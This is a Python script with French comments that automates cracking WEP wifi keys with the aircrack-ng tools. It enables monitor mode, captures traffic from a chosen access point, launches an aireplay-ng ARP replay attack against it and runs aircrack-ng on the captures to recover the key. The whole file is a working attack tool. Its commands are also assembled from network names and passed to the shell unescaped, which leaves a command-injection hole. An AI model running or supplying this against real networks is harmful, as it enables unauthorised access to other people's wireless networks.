#!/usr/bin/python
# -*- coding: utf-8 -*-

import time
import os
import signal
import subprocess

"""
	Pour lancer mettre la clé wifi en monitoring (devient alors mon0)
"""
def monitoring():
	cmd_only_airmon = subprocess.check_output(["airmon-ng"])
	fichier = open("airmon.txt", "w")
	fichier.write(cmd_only_airmon)
	fichier.close()
	fichier = open("airmon.txt", "r")
	file_line = fichier.readline()
	wlan_wanted = ""
	while file_line !="":
		file_line = fichier.readline()
		if "rt2800" in file_line:
			wlan_wanted = file_line[:5].replace(" ", "")
	cmd_monitoring = subprocess.check_output(["airmon-ng", "start", wlan_wanted])

"""
	Ecoute globale, commande airodump (à executer apres le monitoring)
	time: temps de l'écoute en seconde(s)
"""
def global_listening():
	cmd = "airodump-ng -w TestBox/global/record mon0"
	FNULL = open(os.devnull, 'w')
	# The os.setsid() is passed in the argument preexec_fn so
	# it's run after the fork() and before  exec() to run the shell.
	pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)

	return pro.pid

"""
	Ecoute locale sur une seule box via un fichier xml parsé
	registered_network : box sur laquelle on écoute
"""
def network_listening(registered_network):
	BSSID = registered_network._BSSID
	ESSID = registered_network._ESSID
	Channel = registered_network._Channel

	cmd = "airodump-ng -w TestBox/" + ESSID + "/record -d " + BSSID + " mon0 --channel " + str(Channel) +" --ignore-negative-one"

	FNULL = open(os.devnull, 'w')
	pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)

	return pro.pid

"""
	Lancement de l'attaque arp
	registered_network: box que l'on attaque
	/!\ tous les chemins sont en relatifs !!
"""
def arp_attack(registered_network):
	BSSID = registered_network._BSSID
	ESSID = registered_network._ESSID
	Channel = registered_network._Channel

	cmd = "aireplay-ng -3 -e " + ESSID + " -h " + BSSID + " mon0 --ignore-negative-one";

	FNULL = open(os.devnull, 'w')
	pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
	return pro.pid

"""
	Decryptage des iv/cap pour l'obtention de la clé
	datafile_path : dossiers dans lesquels sont les .cap/.iv
"""
def aircrack_final_wep(datafile_path):
	cmd = "aircrack-ng " + datafile_path + "/*<.cap/.iv>";

	FNULL = open(os.devnull, 'w')
	pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
	return pro.pid
